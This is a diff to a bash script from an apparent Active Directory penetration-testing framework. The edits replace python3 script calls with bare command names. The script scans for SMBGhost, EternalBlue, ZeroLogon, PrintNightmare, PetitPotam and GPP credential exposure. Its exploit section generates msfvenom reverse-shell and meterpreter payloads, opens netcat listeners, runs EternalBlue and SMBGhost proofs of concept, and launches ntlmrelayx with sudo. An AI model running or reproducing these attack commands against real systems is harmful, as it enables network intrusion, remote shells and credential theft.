@@ -127,7 +127,8 @@ scanning_network(){
 
     # Getting domain name & domain controllers
     printf "%b\nChecking domain name & domain controllers (IP, hostname) on $network_ip/$subnet...%b" "${YELLOW}" "${NC}"
-    python3 "$PATH_TO_WORKSPACE/SCANNER_AD/get_domain-infos.py" "$network_ip" "$subnet"
+    # python3 "$PATH_TO_WORKSPACE/SCANNER_AD/get_domain-infos.py" "$network_ip" "$subnet"
+    python3 get_domain-infos "$network_ip" "$subnet"
 
     printf "%b\n\n=> The files are saved into known-data/network\n%b" "${BLUE}" "${NC}"
     printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
@@ -195,7 +196,8 @@ scanning_vulns_without-account(){
             if [[ "$REPLY" == "1" ]]; then
                 if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"; then
                     printf "\n${RED}Trying SMBGhost against %s:%s (service: %s)...\n${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbghost_cve20200796_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/smbghost_cve20200796_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"
+                    smbghost_cve20200796_scanner "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -204,7 +206,8 @@ scanning_vulns_without-account(){
             elif [[ "$REPLY" == "2" ]]; then
                 if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"; then
                     printf "\n${RED}Trying SMBleed against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbleed_cve20201206_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/smbleed_cve20201206_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"
+                    smbleed_cve20201206_scanner "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -213,7 +216,8 @@ scanning_vulns_without-account(){
             elif [[ "$REPLY" == "3" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip" ; then
                     printf "\n${RED}Trying EternalBlue against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip"
+                    eternalblue_ms17010_scanner -p "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -222,7 +226,8 @@ scanning_vulns_without-account(){
             elif [[ "$REPLY" == "4" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip" ; then
                     printf "\n${RED}Trying MS08-067 against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/netapi_cve20084250_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/netapi_cve20084250_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip"
+                    netapi_cve20084250_scanner "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -231,7 +236,8 @@ scanning_vulns_without-account(){
             elif [[ "$REPLY" == "6" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"; then
                     printf "\n${RED}Checking SMB Signing status against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbsigning_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/smbsigning_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"
+                    smbsigning_scanner "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -250,8 +256,10 @@ scanning_vulns_without-account(){
             if [[ "$REPLY" == "5" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"; then
                     printf "\n${RED}Trying PetitPotam against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "guest" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "guest" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
+                    petitpotam_scanner "$ip" "$port" "$domain_name" "guest" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
+                    petitpotam_scanner "$ip" "$port" "$domain_name" "" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -260,7 +268,8 @@ scanning_vulns_without-account(){
             if [[ "$REPLY" == "7" ]]; then
                 if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"; then
                     printf "\n${RED}Checking Spooler service against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/rpcdump_scanner.py" "$ip" -port "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/rpcdump_scanner.py" "$ip" -port "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"
+                    rpcdump_scanner "$ip" -port "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -280,7 +289,8 @@ scanning_vulns_without-account(){
             if [[ "$REPLY" == "9" ]]; then
                 if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"; then
                     printf "\n${RED}Trying ZeroLogon against the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/zerologon_cve20201472_scanner.py" "$dc_name" "$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/zerologon_cve20201472_scanner.py" "$dc_name" "$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"
+                    zerologon_cve20201472_scanner "$dc_name" "$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -291,9 +301,11 @@ scanning_vulns_without-account(){
                 if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"; then
                     printf "\n${RED}Searching credentials into the SYSVOL of the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
                     # with guest
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "guest"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "guest"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    getgppcreds_scanner "guest"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                     # with anonymous
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py"  "":""@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py"  "":""@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    getgppcreds_scanner  "":""@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -313,7 +325,8 @@ scanning_vulns_without-account(){
             if [[ "$REPLY" == "11" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"; then
                     printf "\n${RED}Trying BlueGate attack against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/bluegate_cve20200610_scanner.py" -M check -P "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/bluegate_cve20200610_scanner.py" -M check -P "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"
+                    bluegate_cve20200610_scanner -M check -P "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -397,7 +410,8 @@ scanning_vulns_with-domain-account(){
             if [[ "$REPLY" == "1" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip" ; then
                     printf "\n${RED}Trying EternalBlue against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip"
+                    eternalblue_ms17010_scanner -p "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -406,8 +420,11 @@ scanning_vulns_with-domain-account(){
             elif [[ "$REPLY" == "2" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"; then
                     printf "\n${RED}Trying PrintNightmare attack against %s:%s (service: %s) with user: %s:%s...${NC}" "$ip" "$port" "$service" "$ad_user_name" "$ad_user_pwd"
-                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
-                    else python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
+                    # if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
+                    # else python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
+                    # fi 
+                    if [ -n "$ad_user_pwd" ]; then printnightmare_cve20211675_scanner -check "$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
+                    else printnightmare_cve20211675_scanner -check "$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
                     fi 
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
@@ -417,8 +434,11 @@ scanning_vulns_with-domain-account(){
             elif [[ "$REPLY" == "3" ]]; then
                 if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"; then
                     printf "\n${RED}Trying MIC Remove attack against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve20191040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
-                    else  python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve-2019-1040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
+                    # if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve20191040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
+                    # else  python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve-2019-1040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
+                    # fi
+                    if [ -n "$ad_user_pwd" ]; then micRA_cve20191040_scanner -port "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
+                    else  micRA_cve-2019-1040_scanner -port "$port" "$domain_name"/"$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
                     fi
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
@@ -438,7 +458,8 @@ scanning_vulns_with-domain-account(){
             if [[ "$REPLY" == "4" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"; then
                     printf "\n${RED}Trying PetitPotam against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
-                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "$ad_user_name" "$ad_user_pwd" "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"
+                    # python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "$ad_user_name" "$ad_user_pwd" "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"
+                    petitpotam_scanner "$ip" "$port" "$domain_name" "$ad_user_name" "$ad_user_pwd" "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                 fi
@@ -457,8 +478,11 @@ scanning_vulns_with-domain-account(){
             if [[ "$REPLY" == "5" ]]; then
                 if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"; then
                     printf "\n${RED}Trying sAMAccountName Spoofing attack against the DC : %s (%s) with : %s:%s...${NC}" "$dc_ip" "$dc_name" "$ad_user_name" "$ad_user_pwd"
-                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve202142278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name":"$ad_user_pwd" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
-                    else python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve-2021-42278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
+                    # if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve202142278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name":"$ad_user_pwd" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
+                    # else python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve-2021-42278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
+                    # fi
+                    if [ -n "$ad_user_pwd" ]; then sAMAccountName_cve202142278_scanner -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name":"$ad_user_pwd" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
+                    else sAMAccountName_cve-2021-42278_scanner -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
                     fi
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
@@ -468,8 +492,11 @@ scanning_vulns_with-domain-account(){
             elif [[ "$REPLY" == "6" ]]; then
                 if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse_vulns-ip"; then
                     printf "\n${RED}Searching credentials into the SYSVOL of the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
-                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
-                    else python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name"@"$dc_ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    # if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    # else python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name"@"$dc_ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    # fi
+                    if [ -n "$ad_user_pwd" ]; then getgppcreds_scanner "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
+                    else getgppcreds_scanner "$domain_name"/"$ad_user_name"@"$dc_ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                     fi
                 else
                     printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
@@ -554,7 +581,8 @@ exploiting_vulns_without-account(){
                 lport=get_value_int 0 65535
                 msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST="$ip_addr" LPORT="$lport" -f python -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
                 gnome-terminal -- sh "netcat -lvnp $lport; exec bash"
-                python3 smbghost_cve20200796_poc.py -ip "$ip" -p "$port" -f "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
+                # python3 smbghost_cve20200796_poc.py -ip "$ip" -p "$port" -f "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
+                smbghost_cve20200796_poc -ip "$ip" -p "$port" -f "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_smbghost"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -602,7 +630,8 @@ exploiting_vulns_without-account(){
                 msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex64_eternalblue"
                 msfvenom -p windows/meterpreter/reverse_tcp -f raw  EXITFUNC=thread LHOST="$ip_addr" LPORT="$lport" -o "$PATH_TO_WORKSPACE/known-data/exploits/shellcodex86_eternalblue"
                 gnome-terminal -- sh -c "netcat -lvnp $lport; exec bash"
-                python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13
+                # python3 "$PATH_TO_WORKSPACE/POC/eternalblue_ms17010_poc.py" "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13
+                eternalblue_ms17010_poc "$ip" "$PATH_TO_WORKSPACE/known-data/exploits/shellcodeall_eternalblue" 13
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
             fi
@@ -643,7 +672,8 @@ exploiting_vulns_without-account(){
                 # fi
                 printf "\nEnter the type of targeted OS among the following (1=Windows XP, 2=Windows 2000, 3=Windows 2003 SP0, 4=Windows 2003 SP1, 5=Windows XP SP3 French, 6=Windows XP SPR3 English):"
                 read -r case
-                python3 "$PATH_TO_WORKSPACE/POC/netapi_cve20084250_poc.py" "$ip" "$case" "$port"
+                # python3 "$PATH_TO_WORKSPACE/POC/netapi_cve20084250_poc.py" "$ip" "$case" "$port"
+                netapi_cve20084250_poc "$ip" "$case" "$port"
                 printf "\n%bNOT CORRECTLY IMPLEMENTED FOR NOW%b" "${RED}" "${NC}"
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
@@ -666,7 +696,8 @@ exploiting_vulns_without-account(){
                     return
                 fi
                 printf "\n%bNTLMRelayx will be runt over another terminal, please enter your password on it to run it as root (the terminal will sleep 30s waiting for this)\n%b" "${BLUE}" "${NC}"
-                gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/POC/ntlmrelayx.py -t $ip -l $PATH_TO_WORKSPACE/known-data/vulns/ntlmrelayx_loot_$ip; exec bash"
+                # gnome-terminal -- sh -c "sudo python3 $PATH_TO_WORKSPACE/POC/ntlmrelayx.py -t $ip -l $PATH_TO_WORKSPACE/known-data/vulns/ntlmrelayx_loot_$ip; exec bash"
+                gnome-terminal -- sh -c "sudo ntlmrelayx -t $ip -l $PATH_TO_WORKSPACE/known-data/vulns/ntlmrelayx_loot_$ip; exec bash"
                 sleep 30s
             else 
                 printf "%b\nNo vulnerable IP found into your file in known-data/vulns%b" "${RED}" "${NC}"
